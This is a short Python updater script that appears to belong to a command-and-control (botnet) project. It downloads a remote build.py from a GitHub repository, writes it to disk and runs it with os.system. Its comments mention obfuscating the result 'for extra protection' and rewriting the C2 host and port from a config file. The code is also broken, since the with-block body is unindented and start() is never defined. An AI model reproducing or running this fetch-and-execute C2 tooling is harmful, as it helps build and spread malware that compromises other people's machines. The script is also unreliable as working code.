import requests, os

def update():
    kid = requests.get('https://raw.githubusercontent.com/pooman42069/pooc2/main/src/Commands/Tools/build.py')

    with open('build.py', 'w') as file:
    file.write(kid.text)

    os.system('py build.py')
    start()

    #obfuscates for extra protection

    #line 646 cnc.py / rewrites port and host to the one in config.json
    #so make sure its the correct config before running

update()